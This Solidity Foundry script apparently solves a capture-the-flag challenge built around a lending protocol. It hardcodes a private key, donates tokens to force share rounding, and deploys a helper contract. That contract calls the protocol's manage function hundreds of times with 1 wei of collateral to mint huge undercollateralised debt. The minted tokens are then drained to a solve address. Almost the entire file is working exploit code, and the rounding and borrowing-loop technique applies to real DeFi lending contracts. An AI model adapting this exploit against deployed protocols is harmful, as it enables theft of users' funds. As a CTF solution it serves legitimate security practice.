// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";
import {Script, console} from "forge-std/Script.sol";
import "test/xyz.t.sol";

contract XYZScript is Script {
    uint256 privateKey = 0x87f48638e8fddef6031267e369e0210ea72e602815aa589f043dadbf90c1aca2;
    address target = 0x3F84Ff0B4802080FaE74461f5952fa971f8150AB;
    VmSafe.Wallet wallet;

    Challenge challenge;
    Token sETH;
    Manager manager;
    Token XYZ;
    PriceFeed priceFeed;
    address liquidatee;
    ERC20Signal protocolCollateralToken;
    ERC20Signal protocolDebtToken;
    uint256 price = 2207 ether;

    function setUp() public {
        wallet = vm.createWallet(privateKey);

        challenge = Challenge(target);
        manager = Manager(challenge.manager());
        sETH = Token(challenge.seth());
        XYZ = Token(challenge.xyz());
        liquidatee = manager.owner();
        console.log("Is solved: ", challenge.isSolved());

        (
            ERC20Signal _protocolCollateralToken,
            ERC20Signal _protocolDebtToken,
            PriceFeed _priceFeed,
            uint256 operationTime,
            uint256 baseRate
        ) = manager.collateralData(IERC20(address(sETH)));
        protocolCollateralToken = _protocolCollateralToken;
        protocolDebtToken = _protocolDebtToken;
        priceFeed = _priceFeed;
    }

    function run() external {
        if (challenge.isSolved()) {
            console.log("Already solved");
            return;
        }

        vm.startBroadcast(privateKey);
        printBalance(wallet.addr);

        if (XYZ.balanceOf(address(wallet.addr)) > 250_000_000 ether) {
            console.log("done");
            XYZ.transfer(address(0xCAFEBABE), 250_000_000 ether);
            require(XYZ.balanceOf(address(0xCAFEBABE)) == 250_000_000 ether);
            return;
        }

        // ////// PART 1 /////

        // if (sETH.allowance(wallet.addr, address(manager)) < type(uint256).max) {
        //     sETH.approve(address(manager), type(uint256).max);
        // }

        // uint256 MIN_CR = 130 * 1e18 / 100;
        // uint256 inputDebt = 3521e18; //35210e18 //
        // uint256 inputCollateral = 2.5e18; //500eth max debt 8.48846153846153846153846e23
        // inputDebt = inputCollateral * price / MIN_CR;

        // manager.manage(sETH, inputCollateral, true, inputDebt, true);

        // //donate to force roundup share
        // sETH.transfer(address(manager), 5995e18);
        // manager.liquidate(address(liquidatee));

        // manager.manage(sETH, 1, false, 1.0095e25, true);
        // printBalance(wallet.addr);

        ///// PART 2 ////

        DebtBulker bulker = new DebtBulker(XYZ, manager, sETH);
        sETH.transfer(address(bulker), 3000);        

        for (uint256 i = 0; i < 30; i++) {
            bulker.bulkDebt(50);
        }

        if (XYZ.balanceOf(wallet.addr) > 250_000_000 ether) {
            console.log("done");
            XYZ.transfer(address(0xCAFEBABE), 250_000_000 ether);
            require(XYZ.balanceOf(address(0xCAFEBABE)) == 250_000_000 ether);
        }
        printBalance(wallet.addr);
        vm.stopBroadcast();
    }

    function printBalance(address _target) public {
        uint256 debt = protocolDebtToken.balanceOf(address(_target));
        uint256 collateral = protocolCollateralToken.balanceOf(address(_target));

        console.log("--Balance %s --", _target);
        console.log("myXYZ:        %e", XYZ.balanceOf(_target));
        console.log("myDebt:       %e,", debt);
        console.log("myCollateral: %e,", collateral);
        uint256 health = ProtocolMath._computeHealth(collateral, debt, price);
        console.log("health: %e", health);
    }
}

contract DebtBulker {
    Token xyz;
    Manager manager;
    Token seth;

    constructor(Token _xyz, Manager _manager, Token _seth) {
        xyz = _xyz;
        manager = _manager;
        seth = _seth;
        seth.approve(address(manager), type(uint256).max);
    }

    function bulkDebt(uint256 loop) external {
        for (uint256 i = 0; i < loop; i++) {
            manager.manage(seth, 1, true, 8.14e22, true);
        }
        xyz.transfer(msg.sender, xyz.balanceOf(address(this)));
    }

    function withdraw() external {
        xyz.transfer(msg.sender, xyz.balanceOf(address(this)));
    }
}
